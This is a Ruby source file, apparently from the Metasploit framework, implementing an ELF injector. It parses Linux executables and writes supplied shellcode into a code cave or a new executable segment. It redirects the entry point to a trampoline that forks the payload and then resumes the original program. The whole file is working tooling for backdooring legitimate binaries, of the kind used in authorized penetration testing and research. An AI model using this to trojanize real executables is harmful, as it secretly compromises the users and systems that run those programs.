# frozen_string_literal: true

require 'metasm'

module Msf
  module Exe
    # Injects a forked payload into an ELF code cave or a reusable program header.
    class ElfInjector
      ET_EXEC = 2
      ET_DYN = 3

      PT_NULL = 0
      PT_LOAD = 1
      PT_NOTE = 4
      PT_GNU_PROPERTY = 0x6474e553

      SHT_NOBITS = 8

      PF_X = 1
      PF_W = 2
      PF_R = 4

      MAX_ALIGNMENT = 0x200000
      MARKER = "\x00msfelfinject\x01\x00".b.freeze

      CLASS_BITS = {
        1 => 32,
        2 => 64
      }.freeze

      MACHINE_ARCHITECTURES = {
        3 => :x86,
        62 => :x64,
        183 => :aarch64
      }.freeze

      EXPECTED_PROGRAM_HEADER_SIZES = {
        32 => 32,
        64 => 56
      }.freeze

      EXPECTED_SECTION_HEADER_SIZES = {
        32 => 40,
        64 => 64
      }.freeze

      # @return [Symbol, nil] Injection technique used by the last call to generate.
      attr_reader :technique

      # @param template [String] Contents of the ELF executable to modify.
      # @param payload [String] Position-independent Linux shellcode to inject.
      def initialize(template:, payload: ''.b)
        raise ArgumentError, 'template must be a String' unless template.is_a?(String)
        raise ArgumentError, 'payload must be a String' unless payload.is_a?(String)

        @template = template.b
        @payload = payload.b
        parse_header
        parse_program_headers
        parse_section_headers
      end

      # @return [Symbol] The ELF architecture.
      def architecture
        MACHINE_ARCHITECTURES.fetch(@machine)
      end

      # @return [Boolean] Whether this injector's marker is present.
      def injected?
        @template.include?(MARKER)
      end

      # @return [String] A modified ELF that forks the payload and resumes the original entry point.
      def generate
        raise ArgumentError, 'ELF is already injected' if injected?
        raise ArgumentError, 'payload must not be empty' if @payload.empty?

        code_cave = find_code_cave
        return inject_code_cave(code_cave) if code_cave

        inject_new_segment
      end

      private

      def inject_new_segment
        program_header = reusable_program_header
        alignment = segment_alignment
        injected_offset = align_up(@template.bytesize, alignment)
        injected_address = align_up(load_segments.map { |segment| segment[:virtual_address] + segment[:memory_size] }.max, alignment)
        trampoline = build_trampoline(injected_address)
        injected_data = trampoline + @payload + MARKER

        modified = @template.dup
        modified << "\x00".b * (injected_offset - modified.bytesize)
        modified << injected_data
        modified[@entrypoint_offset, @word_size] = pack_word(injected_address)
        modified[program_header[:header_offset], @program_header_size] = encode_program_header(
          type: PT_LOAD,
          flags: PF_R | PF_W | PF_X,
          offset: injected_offset,
          virtual_address: injected_address,
          physical_address: injected_address,
          file_size: injected_data.bytesize,
          memory_size: injected_data.bytesize,
          alignment: alignment
        )
        @technique = :program_header
        modified
      end

      def inject_code_cave(code_cave)
        segment = code_cave.fetch(:segment).dup
        segment[:flags] |= PF_W
        segment[:file_size] += code_cave.fetch(:data).bytesize
        segment[:memory_size] = [segment[:memory_size], segment[:file_size]].max

        modified = @template.dup
        modified[code_cave.fetch(:offset), code_cave.fetch(:data).bytesize] = code_cave.fetch(:data)
        modified[@entrypoint_offset, @word_size] = pack_word(code_cave.fetch(:address))
        modified[segment[:header_offset], @program_header_size] = encode_program_header(segment)
        @technique = :code_cave
        modified
      end

      def parse_header
        raise ArgumentError, 'template is too small to be an ELF' if @template.bytesize < 52
        raise ArgumentError, 'template does not contain an ELF magic value' unless @template.start_with?("\x7fELF".b)

        @bits = CLASS_BITS[@template.getbyte(4)]
        raise ArgumentError, 'unsupported ELF class' unless @bits
        raise ArgumentError, 'only little-endian ELF executables are supported' unless @template.getbyte(5) == 1
        raise ArgumentError, 'unsupported ELF machine architecture' unless MACHINE_ARCHITECTURES.key?(read_integer(18, 2))

        @machine = read_integer(18, 2)
        @type = read_integer(16, 2)
        raise ArgumentError, 'ELF must be ET_EXEC or ET_DYN' unless [ET_EXEC, ET_DYN].include?(@type)

        if @bits == 32
          @word_size = 4
          @entrypoint_offset = 24
          @entrypoint = read_integer(@entrypoint_offset, @word_size)
          @program_header_offset = read_integer(28, 4)
          @section_header_offset = read_integer(32, 4)
          @program_header_size = read_integer(42, 2)
          @program_header_count = read_integer(44, 2)
          @section_header_size = read_integer(46, 2)
          @section_header_count = read_integer(48, 2)
        else
          raise ArgumentError, 'template is too small to be a 64-bit ELF' if @template.bytesize < 64

          @word_size = 8
          @entrypoint_offset = 24
          @entrypoint = read_integer(@entrypoint_offset, @word_size)
          @program_header_offset = read_integer(32, 8)
          @section_header_offset = read_integer(40, 8)
          @program_header_size = read_integer(54, 2)
          @program_header_count = read_integer(56, 2)
          @section_header_size = read_integer(58, 2)
          @section_header_count = read_integer(60, 2)
        end

        raise ArgumentError, 'ELF has an invalid program header size' unless @program_header_size == EXPECTED_PROGRAM_HEADER_SIZES[@bits]
        raise ArgumentError, 'ELF has an invalid program header count' unless @program_header_count.between?(1, 128)

        table_end = @program_header_offset + (@program_header_size * @program_header_count)
        raise ArgumentError, 'ELF program header table is truncated' if table_end > @template.bytesize
      end

      def parse_program_headers
        @program_headers = Array.new(@program_header_count) do |index|
          header_offset = @program_header_offset + (@program_header_size * index)
          if @bits == 32
            values = @template.byteslice(header_offset, @program_header_size).unpack('V8')
            {
              header_offset: header_offset,
              type: values[0],
              offset: values[1],
              virtual_address: values[2],
              physical_address: values[3],
              file_size: values[4],
              memory_size: values[5],
              flags: values[6],
              alignment: values[7]
            }
          else
            values = @template.byteslice(header_offset, @program_header_size).unpack('VVQ<Q<Q<Q<Q<Q<')
            {
              header_offset: header_offset,
              type: values[0],
              flags: values[1],
              offset: values[2],
              virtual_address: values[3],
              physical_address: values[4],
              file_size: values[5],
              memory_size: values[6],
              alignment: values[7]
            }
          end
        end

        raise ArgumentError, 'ELF has no loadable segments' if load_segments.empty?
        unless load_segments.all? do |segment|
          segment[:memory_size] >= segment[:file_size] && segment[:offset] + segment[:file_size] <= @template.bytesize
        end
          raise ArgumentError, 'ELF has an invalid loadable segment'
        end
        raise ArgumentError, 'ELF entry point is not in an executable segment' unless load_segments.any? do |segment|
          segment[:flags] & PF_X != 0 && @entrypoint >= segment[:virtual_address] && @entrypoint < segment[:virtual_address] + segment[:memory_size]
        end
      end

      def parse_section_headers
        @section_ranges = []
        @section_metadata_valid = @section_header_offset.zero? && @section_header_count.zero?
        return if @section_header_count.zero?
        return unless @section_header_size == EXPECTED_SECTION_HEADER_SIZES[@bits]

        table_size = @section_header_size * @section_header_count
        table_end = @section_header_offset + table_size
        return if @section_header_offset.zero? || table_end > @template.bytesize

        @section_ranges << [@section_header_offset, table_end]
        valid = true
        @section_header_count.times do |index|
          header_offset = @section_header_offset + (@section_header_size * index)
          section_type = read_integer(header_offset + 4, 4)
          section_offset = read_integer(header_offset + (@bits == 32 ? 16 : 24), @word_size)
          section_size = read_integer(header_offset + (@bits == 32 ? 20 : 32), @word_size)
          next if section_type == SHT_NOBITS || section_size.zero?

          section_end = section_offset + section_size
          if section_end > @template.bytesize
            valid = false
            break
          end

          @section_ranges << [section_offset, section_end]
        end
        @section_ranges.clear unless valid
        @section_metadata_valid = valid
      end

      def load_segments
        @program_headers.select { |segment| segment[:type] == PT_LOAD }
      end

      def find_code_cave
        return unless @section_metadata_valid

        load_segments.each do |segment|
          next unless segment[:flags] & PF_X != 0

          offset = segment[:offset] + segment[:file_size]
          segment_end_address = segment[:virtual_address] + segment[:file_size]
          padding_size = align_up(segment_end_address, instruction_alignment) - segment_end_address
          address = segment_end_address + padding_size
          file_capacity = file_code_cave_capacity(segment, offset)
          memory_capacity = memory_code_cave_capacity(segment, segment_end_address)
          next if file_capacity <= 0 || memory_capacity <= 0

          data = ("\x00".b * padding_size) + build_trampoline(address) + @payload + MARKER
          next if data.bytesize > [file_capacity, memory_capacity].min

          cave = @template.byteslice(offset, data.bytesize)
          next unless cave && cave.bytes.all?(&:zero?)

          return { segment: segment, offset: offset, address: address, data: data }
        end
        nil
      end

      def file_code_cave_capacity(segment, offset)
        ranges = @program_headers.filter_map do |header|
          next if header.equal?(segment) || header[:file_size].zero?

          [header[:offset], header[:offset] + header[:file_size]]
        end
        ranges.concat(@section_ranges)
        return 0 if ranges.any? { |range_start, range_end| range_start < offset && range_end > offset }

        boundary = ranges.filter_map { |range_start, _range_end| range_start if range_start >= offset }.min || @template.bytesize
        [boundary, @template.bytesize].min - offset
      end

      def memory_code_cave_capacity(segment, address)
        return 0 if load_segments.any? do |header|
          !header.equal?(segment) && header[:virtual_address] < address && header[:virtual_address] + header[:memory_size] > address
        end

        mapped_capacity = segment[:virtual_address] + segment[:memory_size] - address
        return mapped_capacity if mapped_capacity.positive?

        boundary = load_segments.filter_map { |header| header[:virtual_address] if header[:virtual_address] > address }.min
        boundary ? boundary - address : 0
      end

      def reusable_program_header
        null_header = @program_headers.find { |header| header[:type] == PT_NULL }
        return null_header if null_header

        property_ranges = @program_headers.select { |header| header[:type] == PT_GNU_PROPERTY }.map do |header|
          [header[:offset], header[:file_size]]
        end
        note_header = @program_headers.find do |header|
          header[:type] == PT_NOTE && !property_ranges.include?([header[:offset], header[:file_size]])
        end
        raise ArgumentError, 'ELF has no reusable PT_NULL or PT_NOTE program header' unless note_header

        note_header
      end

      def segment_alignment
        alignment = [0x1000, *load_segments.map { |segment| segment[:alignment] }].max
        unless alignment.positive? && (alignment & (alignment - 1)).zero? && alignment <= MAX_ALIGNMENT
          raise ArgumentError, 'ELF segment alignment is unsupported'
        end

        alignment
      end

      def encode_program_header(header)
        if @bits == 32
          header.values_at(:type, :offset, :virtual_address, :physical_address, :file_size, :memory_size, :flags, :alignment).pack('V8')
        else
          header.values_at(:type, :flags, :offset, :virtual_address, :physical_address, :file_size, :memory_size, :alignment).pack('VVQ<Q<Q<Q<Q<Q<')
        end
      end

      def build_trampoline(injected_address)
        implementation = {
          x86: X86,
          x64: X64,
          aarch64: AArch64
        }.fetch(architecture)
        implementation.new(entrypoint: @entrypoint, injected_address: injected_address).generate
      end

      def align_up(value, alignment)
        (value + alignment - 1) & -alignment
      end

      def instruction_alignment
        architecture == :aarch64 ? 4 : 1
      end

      def read_integer(offset, size)
        data = @template.byteslice(offset, size)
        raise ArgumentError, 'ELF header is truncated' unless data && data.bytesize == size

        case size
        when 2
          data.unpack1('v')
        when 4
          data.unpack1('V')
        when 8
          data.unpack1('Q<')
        end
      end

      def pack_word(value)
        @word_size == 4 ? [value].pack('V') : [value].pack('Q<')
      end
    end
  end
end

require 'msf/core/exe/elf_injector/a_arch64'
require 'msf/core/exe/elf_injector/x64'
require 'msf/core/exe/elf_injector/x86'
